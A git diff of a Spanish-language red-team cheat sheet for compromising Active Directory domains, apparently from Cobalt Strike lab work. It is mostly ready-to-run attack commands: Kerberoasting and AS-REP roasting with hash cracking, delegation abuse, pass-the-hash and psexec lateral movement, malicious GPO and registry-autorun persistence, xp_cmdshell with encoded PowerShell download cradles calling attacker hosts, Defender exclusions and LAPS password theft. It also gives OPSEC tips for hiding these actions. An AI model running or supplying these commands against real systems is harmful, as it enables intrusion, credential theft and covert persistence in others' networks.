@@ -1,8 +1,8 @@
 # Domain Enumeration
 
-## 🗃 useful cmd 
-**Domain Level**
-```batch
+### Basic Domain Enumeration
+**cmd - Domain Enumeration**
+```shell
 ipconfig /all
 route print
 net config workstation
@@ -24,10 +24,9 @@ net view \\[Host] /all
 #wmic
 run wmic service get name,pathname
 run wmic logicaldisk get caption
-
 ```
 
-**Local Computer Level**
+**Local Computer Enumeration**
 ```batch
 net user
 net user [User]
@@ -53,12 +52,17 @@ LDAP:
 	ldapsearch -H ldap://test.local -b DC=test,DC=local "(&(objectclass=group)(name=*admin*))"
 ```
 
+---
 ## 🔍 PowerView Enumeration 
 **Ubicar Sesiones de usuarios logueados**
-`net sessions \\dc-2`
+```powershell
+net sessions \\dc-2
+```
 
 **Enumera las sesiones conectadas**
-`Get-NetSession -ComputerName dc-2 | select CName, UserName`
+```powershell
+Get-NetSession -ComputerName dc-2 | select CName, UserName
+```
 
 **Informacion del dominio actual**
 ```powershell
@@ -90,6 +94,7 @@ Get-DomainComputer -Properties dnshostname,operatingsystem | sort -Property Dnsh
 ```powershell
 Get-DomainUser -Properties Samaccountname,description
 ```
+
 **Enumerar un usuario especifico**
 ```powershell
 Get-DomainUser -Identity "[USER]" -Properties Displayname,Memberof | fl
@@ -147,80 +152,86 @@ Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property
 Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
 ```
 
-![](https://i.imgur.com/r0AamfW.png)
-
-
 **Enumera las máquinas donde un usuario/grupo de dominio específico es miembro de un grupo local específico**
+
 ```powershell
 Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
 ```
-![](https://i.imgur.com/VJZEe9f.png)
 
 **Busca usuarios con permisos para crear GPOS en el dominio (Generalmente son los Administradores)**
 ```powershell
 Get-DomainObjectAcl -SearchBase "CN=Enterprise Admins,CN=Users,DC=rto,DC=local" -ResolveGUIDs | ?{ $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
 ```
 
-![](https://i.imgur.com/zaddBGD.png)
-`ConvertFrom-SID S-1-5-21-2697495467-513533215-122973509-1137`
-
+**Convertir el SID para enumerar el objeto**
+```powershell
+ConvertFrom-SID S-1-5-21-2697495467-513533215-122973509-1137
+```
 
 ---
-## 🏴‍☠️ Attacks Surface 
+## 🏴‍☠️ Attacks 
 
 #### Kerberoasting
 Tanto Kerberoasting como ASREPROASTING **nos sirve solamente para Crackear el ticket**
-
 **Detect** 🕵️‍♂️
-tag : #Kerberoast
+
 ```powershell
 Get-DomainUser -SPN | select samaccountname,serviceprincipalname,lastlogon
 ```
 
 **Attacking** ⚔
-Rubeus
-`execute-assembly /opt/tools/rubeus/Rubeus.exe kerberoast /user:svc_test /nowrap`
 
-Powerview 
+Rubeus
+
+```shell
+execute-assembly /opt/tools/rubeus/Rubeus.exe kerberoast /user:svc_test /nowrap
+```
+
+
+**Powerview**
 ```powershell
 1. Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"
 2. Invoke-Kerberoast -Domain dev.evilcorp.local -Identity "svc_test" | fl | Out-File -Encoding UTF8 -FilePath c:\ProgramData\Kerberoast.txt -Append -Force
 ```
 
-Impacket 
+**IMPACKET** 
 ```powershell
 GetUsersSPN.py dev.evilcorp.local/[$user]:[$Pass] -request-user "svc_test"
 ```
 
 ##### Cracking 🪓
-tag : #cracking
-hashcat
-`hashcat -a 0 -m 13100 hash.txt $(pwd)/rockyou.txt --rules-file $(pwd)/hashcat/rules/best64.rule`
+**hashcat**
+```shell
+hashcat -a 0 -m 13100 hash.txt $(pwd)/rockyou.txt --rules-file $(pwd)/hashcat/rules/best64.rule
+```
 
-john
-`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+**john**
+```shell
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
 #### ASREPROASTING
-tag : #asreproast
-
 **Detect** 🕵️‍♂️
-`Get-DomainUser -PreAuthNotRequired | select samaccountname,description,lastlogon`
+```powershell
+Get-DomainUser -PreAuthNotRequired | select samaccountname,description,lastlogon
+````
 
 **Attacking** ⚔
-Rubeus
-`execute-assembly /opt/tools/rubeus/Rubeus.exe asreproast /user:c.rodolfo /nowrap`
 
-Impacket
+**Rubeus**
+```java
+execute-assembly /opt/tools/rubeus/Rubeus.exe asreproast /user:c.rodolfo /nowrap
+```
+
+**Impacket**
+
 ```powershell
 GetNPUsers.py DEV/c.rodolfo -no-pass
 GetNPUsers.py dev.evilcorp.local/ -no-pass -usersfile users.txt
 ```
 
 
-#### Unconstrained 🔗 Chain with - Printer Bug
-tag : #unconstrained
-</br>
-
+#### Unconstrained Delegation 🔗 Podemos encadenarlo con Printer Bug
 **Permite que un usuario actue en nombre de otro usuario u otro servicio**. además podemos encadenar esta vulnerabilidad con el error de la impresora ('spoolsample')
 
 **Detect** 🕵️‍♂️
@@ -229,41 +240,50 @@ Get-DomainComputer -Unconstrained | select Dnshostname,operatingsystem
 ```
 
 **SpoolSample**
-`execute-assembly c:\Binaries\Rubeus.exe monitor /interval:10 /nowrap`
-`execute-assembly c:\Binaries\SpoolSample.exe dc-2 srv-1`
+```shell
+execute-assembly c:\Binaries\Rubeus.exe monitor /interval:10 /nowrap
+execute-assembly c:\Binaries\SpoolSample.exe dc-2 srv-1
+```
 
 Podemos usar el ticket si lo convertimos de B64 a su formato nativo o podemos usar rubeus
 
-`Rubeus.exe ptt /ticket:<base64ticket>`
+```shell
+Rubeus.exe ptt /ticket:<base64ticket>
+```
 
-#### Constrained 🔗 Alternative Service   
-tag : #unconstrained 
-</br>
+#### Constrained 🔗 Podemos encadenarlo con Alternative Service   
 
 **a diferencia de Unconstrained, Constrained Restringe los servicios a lo que el Usuario puede aceder**
 
 >**Para aprovecharnos de **Alternative Service** debemos primero hacernos con la maquina, pedir su tgt, impersonalizar y alternar el servicio.**
 
 **Detect** 🕵️‍♂️
+
 Enumerate Users and Computers with constrained delegation
+
 ```powershell
 Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
 Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
 ```
 
 **Attacking** ⚔
+
 Primero necesitamos un ticket de usuario para pedir el vale de servicio.
 
 1. Pidiendo un TGT desde el usuario que tiene un vale para el TGS
-`execute-assembly /opt/tools/rubeus/Rubeus.exe tgtdeleg /nowrap`
+```java
+execute-assembly /opt/tools/rubeus/Rubeus.exe tgtdeleg /nowrap
+```
 
-Alternativa
+**Alternativa**
 Solicitando un TGT si es que tenemos el hash o la contraseña del usuario
+
 ```shell
 execute-assembly /opt/tools/rubeus/Rubeus.exe asktgt /user:svc_test /rc4:2e39dc7d0f27069d7bcabb8670a9348b /nowrap
 ```
 
 2. Solicitando el TGS e impersonalizando a un usuario Administrador en la computador que tiene el **Unconstraied Delegation**
+
 ```shell
 #(S4U con Ticket)
 execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:svc_test /impersonateuser:Sadam /msdsspn:cifs/sql-1.dev.evilcorp.local /ticket:[..Ticket..] /nowrap
@@ -277,7 +297,8 @@ execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:svc_test /impersonateuse
 ```
 
 3. Utilizando el Ticket de servicio
-tag : #tickets
+
+
 ```shell
 #(powershell)
 [System.IO.File]::WriteAllBytes("c:\users\administrator\desktop\dc2-tgt.kirbi", [System.convert]::FromBase64String("[..ticket..]"))
@@ -298,7 +319,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuse
 ```
 
 **example**: 
-tag: #alterservice
+
 ```powershell
 # Detect
 Get-DomainComputer -TrustedToAuth | select -exp msds-allowedtodelegateto
@@ -332,12 +353,11 @@ readlink -f Cifs-Dc-2.kirbi | xclip -sel clip
 kerberos_ticket_use 
 ```
 
-
-
 ---
-## 🏃‍♂️ Lateral Movements 
+## 🥷 Lateral Movements 
 
 ```batch
+
 #(Jump)
 jump psexec64 SRV-1 WKSTN-1-PIVOT4444
 jump psexec_psh SRV-1 WKSTN-1-PIVOT4444
@@ -372,7 +392,7 @@ pth DEV\jking 4ffd3eabdce2e158d923ddec72de979e
 ls \\srv-2\c$
 ```
 
-// Plus Remote-exec
+## Execute Remote Commands - Remote-exec
 ```powershell
 start wmic /node:@C:\\share$\\comps1.txt /user:"DOMAIN\\Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \\\\dc-2\\share$\\fx166.exe %APPDATA%\\fx166.exe & %APPDATA%\\fx166.exe"
 
@@ -382,7 +402,7 @@ shell wmic /node:[target] process call create "cmd /c rundll32.exe C:\\windows\\
 ```
 
 ### GPO Recon
-tag : #gpo
+
 ```powershell
 1. Get-DomainOU -Domain dev.cyberbotic.io -Properties Name				-> List OU
 Get-DomainOU -Identity "$NAME" 							-> Retrieve Distinguishedname
@@ -414,6 +434,7 @@ Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,a
 ### Enumeration GPO
 
 **Consulta devuelve los SID de usuario/grupo que puede crear nuevos GPO en el dominio**
+
 ```powershell
 powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
 
@@ -440,40 +461,51 @@ powershell ConvertFrom-SID "S-1-5-21-2697495467-513533215-122973509-1114"
 DEV\Developers
 ```
 
-> Llegamos a la conclusion de que los usuarios del grupo "1st line support" pueden crear GPOS y Linkearlas a Unidades organizativas, lo que implica que tenemos un escenario para escalar privilegios rapidamente.
+Llegamos a la conclusion de que los usuarios del grupo **"1st line support"** pueden crear GPOS y Linkearlas a Unidades organizativas, lo que implica que tenemos un escenario para escalar privilegios rapidamente.
 
 para resolver el objeto.
 
 ```powershell
 powershell Get-DomainGPO -Name "{911DBB17-FE3C-403F-9CA6-0B01E512A95C}"
 
+Result
+---
 displayname              : Powershell Logins
 ```
 
-**BloodHound 🐕‍🦺**
-> MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
+**BloodHound 🐲**
+
+Filter :
+
+```txt
+MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
+```
 
 **IMPORTANTE - SE USA CON OYENTES INVERSOS TCP PARA EVITAR CONEXCIONES SALIENTES EN EL DOMINIO (PIVOT LISTENER)**
 
 a tener en cuenta que si :
-- Si el puerto 445 está cerrado en el destino, no podemos usar agentes de escucha SMB.
-- Si el firewall de destino no permite la entrada de puertos arbitrarios, no podemos usar escuchas TCP.
+- Si el puerto **445** está cerrado en el destino, no podemos usar agentes de escucha SMB.
+- Si el **firewall** de destino no permite la entrada de puertos arbitrarios, no podemos usar escuchas **TCP**.
 - Si la máquina actual no permite la entrada de puertos arbitrarios, no podemos usar escuchas Pivot.
 
 **⛩ Puede ser estrategicamente necesario abrir puertos en el windows de firewall para facilitar el movimiento lateral ⛩.**
 
  Para habilitar esta regla.
-`netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444`      -> TCP
+```cmd
+netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444      -> TCP
+```
 
 Para Deshabilitar.
-`netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444`
+```cmd
+netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
+```
 
 #### Rsat  Remote Server Administration Tools
 Es un componente de administracion proporcionado por microsoft para administrar componentes en un dominio, y que a menudo se encuentra en servidores y estaciones de trabajo de administracion, puede ser util.
 
 El módulo **GroupPolicy** tiene varios cmdlets de PowerShell que se pueden usar para administrar GPO, incluidos:
 
-| Comando                     | Explanation                                                                                                           |
+|**Comando**                 |**Explanation**                                                                                                         |
 | --------------------------- | --------------------------------------------------------------------------------------------------------------------- |
 | **New-GPO**                 | crea un nuevo GPO vacío.                                                                                              |
 | **New-GPLink**              | vincule un GPO a un sitio, dominio o unidad organizativa.                                                             |
@@ -483,12 +515,15 @@ El módulo **GroupPolicy** tiene varios cmdlets de PowerShell que se pueden usar
 
 
 para comprobar si el modulo esta instalado podemos utilizar:
+
 ```powershell
 Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
 ```
 
-**En un apuro, puede instalarlo `Install-WindowsFeature –Name GPMC` como administrador local.**
-
+En un apuro, puede instalarlo 
+```powershell
+Install-WindowsFeature –Name GPMC  -> como administrador local
+```
 ---
 
 Crear y linkear una GPO a una unidad Organizativa
@@ -504,7 +539,7 @@ Target      : OU=Workstations,DC=dev,DC=evilcorp,DC=local
 Order       : 4
 ```
 
-> OPSEC : el GPO será visible en la Consola de administración de directivas de grupo y otras herramientas RSAT GPO, así que asegúrese de que el nombre sea "convincente"
+OPSEC 🇦🇱 : **el GPO será visible en la Consola de administración de directivas de grupo y otras herramientas RSAT GPO, así que asegúrese de que el nombre sea "convincente"**
 
 Ser capaz de escribir cualquier cosa, en cualquier lugar en las colmenas **HKLM o HKCU** presenta diferentes opciones para lograr la ejecución del código. Una forma sencilla es crear un nuevo valor de ejecución automática para ejecutar una carga útil de Beacon en el arranque.
 
@@ -519,6 +554,7 @@ software          0                     dc-2.dev.cyberbotic.io
 ```
 
 Creamos un valor de registro en nuestra GPO.
+
 ```powershell
 powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\gpo.exe" -Type ExpandString 
 
@@ -539,14 +575,18 @@ WmiFilter        :
 
 ```
 
->Cada máquina normalmente actualizará sus GPO automáticamente cada dos horas. 
+Cada máquina normalmente actualizará sus GPO automáticamente **cada dos horas**. 
 
 Para hacerlo manualmente 
-`gpupdate /target:computer /force`
+```batch
+gpupdate /target:computer /force
+```
 
-> OPSEC : ¡También notará que esto deja un símbolo del sistema en la pantalla!
-Una mejor manera de hacerlo podría ser `%COMSPEC% /b /c start /b /min`
-
+OPSEC 🇦🇱 : ¡También notará que esto deja un símbolo del sistema en la pantalla!
+Una mejor manera de hacerlo podría ser 
+```cmd
+%COMSPEC% /b /c start /b /min
+```
 
 #### SharpGPO Abuse 🦈
 
@@ -569,9 +609,12 @@ beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPO
 ```
 
 
-#### Enumerando Defensas SeatBelt 🎟
+#### Enumerando Defensas SeatBelt 
 con seatbelt podemos enumerar la maquina remotamente, para analizar 
-`execute-assembly /opt/tools/Seatbelt.exe -group=system -computername=sql-1.dev.evilcorp.local -outputfile="c:\programdata\seatbelt.txt"`
+
+```cmd
+execute-assembly /opt/tools/Seatbelt.exe -group=system -computername=sql-1.dev.evilcorp.local -outputfile="c:\programdata\seatbelt.txt"
+```	
 
 **la data importante se encuentra en esta salida**
 ```txt
@@ -627,16 +670,16 @@ Mapped Drives (via WMI)
   Description                    : RESOURCE CONNECTED - Microsoft Windows Network
 ```
 
->Algunos de los comandos de Seatbelt también se pueden ejecutar de forma remota, lo que puede ser útil para enumerar las defensas antes de saltar a él
+Algunos de los **comandos de Seatbelt** también se pueden ejecutar de **forma remota**, lo que puede ser útil para enumerar las defensas antes de saltar a él equipo
 
 **SeatBelt**
+
 ```java
 execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
 ```
 
-
 #### Defender Exclusion
-tag : exclusion
+
 ```
 #(Checkear ruta de exclusiones del defender de manera remota)
 remoto-exec winrm dc-2 Get-MpPreference | seleccione Exclusión* 
@@ -731,6 +774,7 @@ proxychains python3 mssqlclient.py dev/johndoe:Password1\!@10.10.40.221 -dc-ip 1
 
 
 #### XP_CMDSHELL
+
 ```sql
 #(habilitando funciones avanzadas de MSSQL) 
 sp_configure 'show advanced options', '1' 
@@ -763,7 +807,7 @@ SELECT * FROM OPENQUERY("SQL-1.CYBERBOTIC.IO", 'select * FROM OPENQUERY("sql01.z
 
 
 #### RPC OUT
-```mssql
+```sql
 
 # Enabling xp_cmdshell
 EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql.rto.external]
@@ -775,19 +819,17 @@ EXECUTE('EXEC xp_cmdshell ''hostname && whoami'';') AT [sql.rto.external]
 
 EXECUTE('EXEC xp_cmdshell ''powershell -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADUANQA6ADgAMAA4ADAALwBiACIAKQApAAoA'';') AT [sql.rto.external]
 
-
 ```
-
 
 ---
 
-
 ### Persistencia con SharpPersist 🧲
-tag: #persist 
+
 El programador de tareas de windows nos permite crear "tareas" que se ejecutan con un 'disparador' predeterminado, ese evento podria ser una hora del dia, o la sesion de inicio de algun usuario
 
 ##### Creando Tarea Programada
 **En Linux**
+
 ```bash
 root@kali:~# str='IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))' 
 root@kali:~# echo -en $str | iconv -t UTF-16LE | base64 -w 0 
@@ -803,6 +845,7 @@ SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQA
 ```
 
 Creando una tarea programada en sharpersist
+
 ```java
 execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
 ```
@@ -836,12 +879,15 @@ beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.
 ```
 
 ##### Registry Autorun
-
 el registro que se suele ejecutar durante el inicio de sesion es el siguiente: 
-`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+
+```txt
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+```
 
 Primero debemos crear una carga util, para que el registro apunte hacia ella y la ejecute en el inicio
-```
+
+```batch
 beacon> cd C:\ProgramData
 beacon> upload C:\Payloads\beacon-http.exe
 beacon> mv beacon-http.exe updater.exe
@@ -865,9 +911,8 @@ beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.
 tambien podemos usar la colmena de **"HKLM"** pero para ella necesitamos privilegios de administrador, ya que es la colmena general de registros del equipo y no personal del usuario como lo es **"HKCLU"**.
 
 ### Laps
-tag : #laps
-
 **Utilizando Powerview**
+
 ```shell
 # Identificar si la maquina actual que comprometimos es un cliente de laps
 ls C:\Program Files\LAPS\CSE
@@ -890,7 +935,7 @@ Parse-PolFile .\Registry.pol
 
 ```
 
-Utilizando el cmdlet nativo de laps para administrar 🐌
+Utilizando el cmdlet nativo de laps para administrar
 
 ```shell
 # checkeando si esta instalado el cmdlet
@@ -1096,10 +1141,10 @@ MemberSID               : S-1-5-21-2697495467-513533215-122973509-1138
 
 ### Forest And Domain Trust
 
-tag : #trust
-
 #### Inbound ➡
+
 Debido a que la confianza es entrante desde nuestra perspectiva, significa que a los principales en nuestro dominio se les puede otorgar acceso a los recursos en el dominio externo.
+
 ```powershell
 # Map Trust Domains
 powershell Invoke-MapDomainTrust | select SourceName,TargetName,TrustDirection 
@@ -1168,3 +1213,4 @@ execute-assembly /opt/tools/rubeus/Rubeus.exe ptt /ticket:[..Tgs..]
 ls \\ad.sucursal.external\c$
 
 ```
+
